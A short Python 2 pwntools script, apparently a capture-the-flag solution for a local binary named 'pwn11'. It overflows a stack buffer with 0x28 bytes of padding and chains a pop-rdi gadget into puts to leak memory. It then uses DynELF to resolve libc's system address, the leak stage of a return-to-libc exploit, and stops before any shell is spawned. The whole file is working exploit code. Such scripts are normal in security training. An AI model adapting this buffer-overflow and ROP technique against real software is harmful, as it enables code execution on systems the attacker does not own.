#!/usr/bin/python2

from pwn import *

sh = process('./pwn11')

pop_rdi = p64(0x004012ab)
puts_plt = p64(0x00401030)


def leak(address):
    payload = "a" * 0x28 + pop_rdi + address + puts_plt
    sh.sendline(payload)

    data = sh.recv(8)

    log.debug("%#x => %s" % (address, (data or'').encode('hex')))

    return data

d = DynElf(leak,elf=ELF("./pwn11"))
systemAddress = d.lookup('system','libc')


